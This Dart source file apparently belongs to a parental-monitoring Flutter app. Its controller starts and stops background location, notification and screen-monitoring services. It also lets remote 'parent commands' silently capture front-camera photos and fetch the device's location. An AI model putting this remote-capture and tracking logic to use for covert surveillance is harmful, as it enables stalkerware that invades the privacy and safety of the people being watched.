// controllers/background_controller.dart
import 'package:get/get.dart';
import 'dart:developer' as developer;
import '../services/background/background_service_manager.dart';
import '../services/background/location_service.dart';
import '../services/background/notification_service.dart';
import '../services/background/screen_monitor_service.dart';
import '../services/background/camera_service.dart';

class BackgroundController extends GetxController {
  static const String _tag = 'BackgroundController';
  static BackgroundController get to => Get.find();

  final RxBool servicesRunning = false.obs;
  final RxBool isInitializing = false.obs;

  @override
  void onInit() {
    super.onInit();
    developer.log('BackgroundController initialized', name: _tag);
  }

  Future<void> initializeAllServices() async {
    if (isInitializing.value || servicesRunning.value) {
      developer.log(
        'Services already running or initializing, skipping',
        name: _tag,
      );
      return;
    }

    isInitializing.value = true;

    try {
      developer.log('Starting to initialize all services', name: _tag);

      // Check if service already running
      bool isRunning = await BackgroundServiceManager.isServiceRunning();

      if (isRunning) {
        developer.log('Background service already running', name: _tag);
        servicesRunning.value = true;
        isInitializing.value = false;
        return;
      }

      // Initialize camera service (quick operation)
      try {
        await CameraService.initialize();
        developer.log('✓ Camera service initialized', name: _tag);
      } catch (e) {
        developer.log(
          '⚠ Camera initialization failed',
          name: _tag,
          error: e,
          level: 900,
        );
      }

      // Start background service
      BackgroundServiceManager.startBackgroundServices();
      developer.log('✓ Background service start triggered', name: _tag);

      // Wait for service to actually start
      await Future.delayed(const Duration(milliseconds: 2000));

      // Verify service is running
      isRunning = await BackgroundServiceManager.isServiceRunning();

      if (isRunning) {
        servicesRunning.value = true;
        developer.log('✓ All services initialized successfully', name: _tag);
      } else {
        developer.log(
          '⚠ Background service failed to start',
          name: _tag,
          level: 900,
        );
        servicesRunning.value = false;
      }
    } catch (e, stackTrace) {
      developer.log(
        'Error initializing services',
        name: _tag,
        error: e,
        stackTrace: stackTrace,
        level: 1000,
      );
      servicesRunning.value = false;
    } finally {
      isInitializing.value = false;
    }
  }

  void stopAllServices() {
    developer.log('Stopping all services', name: _tag);

    try {
      LocationService.stopTracking();
      NotificationService.stopListening();
      ScreenMonitorService.stopMonitoring();
      BackgroundServiceManager.stopBackgroundServices();

      servicesRunning.value = false;

      developer.log('✓ All services stopped', name: _tag);
    } catch (e) {
      developer.log(
        'Error stopping services',
        name: _tag,
        error: e,
        level: 1000,
      );
    }
  }

  void handleParentCommand(Map<String, dynamic> command) {
    developer.log('Received parent command: ${command['type']}', name: _tag);

    try {
      switch (command['type']) {
        case 'CAPTURE_PHOTO':
          CameraService.captureAndSend(
            useFrontCamera: command['front_camera'] ?? true,
          );
          break;
        case 'REQUEST_LOCATION':
          LocationService.sendImmediateLocation();
          break;
        case 'START_MONITORING':
          if (!servicesRunning.value && !isInitializing.value) {
            initializeAllServices();
          }
          break;
        case 'STOP_MONITORING':
          stopAllServices();
          break;
        default:
          developer.log(
            'Unknown command type: ${command['type']}',
            name: _tag,
            level: 900,
          );
      }
    } catch (e) {
      developer.log(
        'Error handling parent command',
        name: _tag,
        error: e,
        level: 1000,
      );
    }
  }

  @override
  void onClose() {
    developer.log('BackgroundController disposed', name: _tag);
    super.onClose();
  }
}
